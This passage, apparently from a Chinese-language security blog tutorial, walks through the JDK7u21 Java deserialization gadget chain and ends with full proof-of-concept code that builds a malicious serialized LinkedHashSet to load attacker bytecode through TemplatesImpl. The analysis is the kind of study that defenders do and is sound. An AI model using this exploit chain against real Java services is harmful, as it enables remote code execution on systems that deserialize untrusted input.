++var4) &#123;  </span><br><span class="line">            Method var5 = var2[var4];  </span><br><span class="line">            String var6 = var5.getName();  </span><br><span class="line">            Object var7 = this.memberValues.get(var6);  </span><br><span class="line">            Object var8 = null;  </span><br><span class="line">            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);  </span><br><span class="line">            if (var9 != null) &#123;  </span><br><span class="line">                var8 = var9.memberValues.get(var6);  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                try &#123;  </span><br><span class="line">                    var8 = var5.invoke(var1);  </span><br><span class="line">                &#125; catch (InvocationTargetException var11) &#123;  </span><br><span class="line">                    return false;  </span><br><span class="line">                &#125; catch (IllegalAccessException var12) &#123;  </span><br><span class="line">                    throw new AssertionError(var12);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            if (!memberValueEquals(var7, var8)) &#123;  </span><br><span class="line">                return false;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> /**/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先来看equalsImpl()  方法<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/1.jpg"></p><p>跟进这个  getMemberMethods() 方法，可以知道 这是遍历 this.type 这个对象的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，equalsImpl()  这个方法是将 this.type 类中的所有方法都遍历执行了，那么，假设 this.type 是Templates 类，那么一定会调用到 其中的  newTransformer() 或者 getOutputProperties() 方法，进而触发任意代码执行  ， 这就是JDK7u21 的核心原理~</p><h1 id="寻找-equalsImpl-调用链"><a href="#寻找-equalsImpl-调用链" class="headerlink" title="寻找 equalsImpl 调用链"></a>寻找 equalsImpl 调用链</h1><p>我们现在的目标就是为了调用这个 equalsimpl ，而 equalsimpl 是一个  private 私有方法，在 AnnotationInvocationHandler#invoke 中被调用。<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/2.jpg"></p><p>AnnotationInvocationHandler 是 一个InvocationHandler 接口的实现， InvocationHandler是一个接口，他只有一个方法就是invoke：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    public Object invoke(Object proxy, Method method, Object[] args)  </span><br><span class="line">        throws Throwable;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在使用 java.reflect.Proxy 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到 InvocationHandler#invoke 。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是 被执行的方法名，第三个参数是执行时的参数列表。</p><p>我们来看看 AnnotationInvocationHandler#invoke</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;  </span><br><span class="line">    String var4 = var2.getName();  </span><br><span class="line">    Class[] var5 = var2.getParameterTypes();  </span><br><span class="line">    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;  </span><br><span class="line">        return this.equalsImpl(var3[0]);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        assert var5.length == 0;  </span><br><span class="line">  </span><br><span class="line">        if (var4.equals(&quot;toString&quot;)) &#123;  </span><br><span class="line">            return this.toStringImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">            return this.hashCodeImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;annotationType&quot;)) &#123;  </span><br><span class="line">            return this.type;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.................</span><br></pre></td></tr></table></figure><p>如果 传入的方法名 为  “equals”  且方法仅有一个类型参数时，就会调用 equalsImpl()</p><p>所以我们要找到一个方法， 反序列化时 对proxy 调用 equals 方法</p><h1 id="找到equals-调用链"><a href="#找到equals-调用链" class="headerlink" title="找到equals 调用链"></a>找到equals 调用链</h1><p>在上篇我们遇到，和equals 类似的 用法有另一个方法， <code>CompareTo</code>  他通常被实现用于比较两个对象的值是是否相等，但他用的 compareTo 方法，并不是我们需要的 equals，另一个常见的会调用 equals 的场景就是 集合Set ，Set 中储存的 对象不允许重复，所以在添加对象时，一定会触碰到对比的操作 。</p><p>我们来看一下 HashSet 的ReadObject 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)  </span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">        // Read in any hidden serialization magic  </span><br><span class="line">        s.defaultReadObject();  </span><br><span class="line">  </span><br><span class="line">        // Read in HashMap capacity and load factor and create backing HashMap  </span><br><span class="line">        int capacity = s.readInt();  </span><br><span class="line">        float loadFactor = s.readFloat();  </span><br><span class="line">        map = (((HashSet)this) instanceof LinkedHashSet ?  </span><br><span class="line">               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :  </span><br><span class="line">               new HashMap&lt;E,Object&gt;(capacity, loadFactor));  </span><br><span class="line">  </span><br><span class="line">        // Read in size  </span><br><span class="line">        int size = s.readInt();  </span><br><span class="line">  </span><br><span class="line">        // Read in all elements in the proper order.  </span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;  </span><br><span class="line">            E e = (E) s.readObject();  </span><br><span class="line">            map.put(e, PRESENT);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>map</code>也是瞬态属性。这里得到的很明显是<code>HashMap</code>，然后依次从<code>s.readObject()</code>里面读取key，然后调用<code>map.put</code>方法放进去，因为也说了，<code>HashSet</code>的底层实现还是<code>HashMap</code>， 还要说一点， 哈希表其实是由 数组 + 链表实现的， 哈希表 底层 保存在一个数组中，数组的索引是由哈希表的键的hash值计算得到的 ，也就是 key.hashcode() , 数组的值是一个链表，所有hash碰撞到相同索引的key-value，都会被链接到 链表后面 ，这里借用 p牛的一张图 </p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/3.jpg"></p><p>我们跟进一下这里的 put 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;  </span><br><span class="line">    if (key == null)  </span><br><span class="line">        return putForNullKey(value);  </span><br><span class="line">    int hash = hash(key);  </span><br><span class="line">    int i = indexFor(hash, table.length);  </span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;  </span><br><span class="line">        Object k;  </span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;  </span><br><span class="line">            V oldValue = e.value;  </span><br><span class="line">            e.value = value;  </span><br><span class="line">            e.recordAccess(this);  </span><br><span class="line">            return oldValue;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现 对放入的 key进行了 hash，看见这里的  if 方法内，如果当前的map 中 有hash值相同的key，就会 key.equals(k) 如果 key 是代理对象，k 为TemplatesImpl ，则此时会调用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke-&gt;AnnotationInvocationHandler.equalsImpl-&gt;TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><p>从而执行命令， 所以我觉得，能找到这条链子的师傅实在是实力强👍</p><p>计算  “哈希” 的主要是下面这两行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int hash = hash(key);  </span><br><span class="line">int i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure><p>跟进 hash()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">final int hash(Object k) &#123;  </span><br><span class="line">    int h = 0;</span><br><span class="line">h ^= k.hashCode();  </span><br><span class="line">  </span><br><span class="line">h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);  </span><br><span class="line">    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了 调用hashCode 外，没有其他的东西，所以 proxy 对象 与TemplateImpl   是否相等，取决于这两个对象的 hashcode() 是否相等。那我们就来看看这两个方法，首先是 TemplatesImpl 的hashcode 方法，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        TemplatesImpl templates2 = new TemplatesImpl();  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+templates.hashCode());  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+ templates2.hashCode());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/4.jpg"></p><p>发现他每次 的hashCode 后的值都不唯一，Debug 也无法跟踪调试，而是直接打印了其hash值，网上说是 Native 方法 ，那么什么是Native方法？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">native 是用做java 和其他语言（如c++）进行协作时使用的，也就是native 后的函数的实现不是用java写的。  </span><br><span class="line">既然都不是java，那就别管它的源代码了，我们只需要知道这个方法已经被实现即可。  </span><br><span class="line">native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。  </span><br><span class="line">java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。</span><br></pre></td></tr></table></figure><p>虽然如此，我们不难发现， 每次运行 其hash 都在改变，所以想让 proxy 的hashCode 与其相等，只能寄希望于 proxy.hashCode() ….</p><p>再想想代理对象的hashCode 方法，既然是代理对象，调用其 hashCode() 很明显会调用到 AnnotationInvocationHandler#invoke 进而调用到 AnnotationInvocationHandler#hashCodeImpl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">    return this.hashCodeImpl();</span><br></pre></td></tr></table></figure><p>进入此方法 看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private int hashCodeImpl() &#123; </span><br><span class="line">int result = 0; </span><br><span class="line">for (Map.Entry e : memberValues.entrySet()) &#123; </span><br><span class="line">result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">return result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，就是遍历这个 memberValues这个Map ，把每次计算出来的  127*(key的hash)^(value的hash)  </p><p>开发出这链子的作者很牛逼，他想到让这个 memberValues这个Map 只有一个键值对，让key 的hash为 0  ，这样 127*0 &#x3D; 0  ，然后0 ^ xxx 仍然是xxx (相同为0  ，不同为1)，再让value 是恶意的 TemplatesImpl对象，这样计算的就是那个 <code>TemplatesImpl</code>对象的hash值 自然就 两个hash 相等了。</p><p>不得不说 nbbbbbbb</p><p>所以我们找到一个 hashCode 是 0 的对象作为 memberValues 的key，将恶意TemplateImpl对象作为 value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。</p><p>找一个hashCode 是 0 的对象，我们可以写一个脚本爆破一下 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        for (long i = 0; i &lt; 9999999999L; i++) &#123;  </span><br><span class="line">            if (Long.toHexString(i).hashCode() == 0)&#123;  </span><br><span class="line">                System.out.println(Long.toHexString(i));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本跑出来的是 f5a5a608 </p><h1 id="利用链整理"><a href="#利用链整理" class="headerlink" title="利用链整理"></a>利用链整理</h1><p>说了这么多，想必脑子也昏昏的了，这里就整理一下过程</p><ul><li>首先 第一步肯定是 生成 TemplateImpl 恶意对象</li><li>实例化 AnnotationInvocationHandler对象 <ul><li>他的type属性是一个 TemplateImpl 类(因为getMemberMethods会遍历其方法)</li><li>他的memberValues属性是一个Map，Map只有一个Key和Value，Key是f5a5a608，value是TemplateImpl类</li></ul></li><li>对 AnnotationInvocationHandler对象做一层代理，生成proxy 对象(因为要进入invoke 调用hashcode)</li><li>实例化一个HashSet 这个 HashSet 有两个元素 分别是<ul><li>TemplateImpl对象</li><li>proxy对象</li></ul></li><li>将HashSet 对象序列化</li></ul><p>反序列化触发代码如下：</p><ul><li>触发HashSet的readobject方法，其中 使用HashMap的Key去重</li><li>去重时计算HashSet中的两个元素的 hashCode() ，因为我们的静心构造二者相等，进而触发 equals() 方法</li><li>调用 AnnotationInvocationHandler#equalsImpl 方法</li><li>equalsImpl 中遍历 this.type 的每个方法并调用</li><li>因为 this.type 是TemplatesImpl类，所以触发了 newTransform() 或 getOutputProperties() 方法</li><li>代码执行</li></ul><p>按我的理解简单来说，就是利用hashCodeImpl() 使 两者的key的hash相同，就会进行比较，调用 equals方法，从而进行漏洞利用。<br>让我震惊的就是equals的调用和这个hash值的构造，属实tql</p><p>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import org.apache.commons.codec.binary.Base64;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class JDK7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        // 实例化AnnotationInvocationHandler类</span><br><span class="line">        Constructor handlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(true);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        // 为tempHandler创造一层代理</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        // 实例化HashSet，并将两个对象放进去</span><br><span class="line">        HashSet set = new LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        // 将恶意templates设置到map中</span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我会给大家剖析 POC 怎么构造的，深刻理解POC原理</p><p>雷打不动的 TemplatesImpl对象设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilCode&#125;);</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;Ku1s&quot;);</span><br></pre></td></tr></table></figure><p>然后是 new 一个 AnnotationInvocationHandler对象，看看他的构造器：</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/5.jpg"></p><p>前面也说过，type 是 TemplatesImpl对象，将循环调用他全部方法，而memberMethods 是一个键值对，其Key 是 0 ，value 则是 TemplatesImpl.hash 。</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/6.jpg"></p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/7.png"></p><p>所以我们 先创建一个 memberMethods ，我们也说过，他本质上是个HashMap ，添加其值，我们先不把TemplatesImpl 放进 memberValues的value，待会会说为什么，然后再实例化 AnnotationInvocationHandler，进行初始化构造(因为此类无法new 所以要 class.forname) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //得到构造器  </span><br><span class="line">constructor.setAccessible(true);  </span><br><span class="line">InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //实例化</span><br></pre></td></tr></table></figure><p>然后就是生成动态代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>然后就是生成反序列化链的起点，那个<code>HashSet</code>对象了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet = new LinkedHashSet();</span><br><span class="line">hashSet.add(templates);</span><br><span class="line">hashSet.add(proxy);</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,templates);</span><br></pre></td></tr></table></figure><p>这里再覆盖掉<code>f5a5a608</code>的value，就是为了防止这里的2次<code>add</code>直接触发了漏洞。 </p><p>完整POC：<br>JDK7u21.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public class JDK7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;  </span><br><span class="line">            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()  </span><br><span class="line">        &#125;);  </span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;Ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //得到构造器  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //实例化  </span><br><span class="line">  </span><br><span class="line">        //然后就是生成动态代理  </span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashSet hashSet = new LinkedHashSet();  </span><br><span class="line">        hashSet.add(templates);  </span><br><span class="line">        hashSet.add(proxy);  </span><br><span class="line">  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,templates);  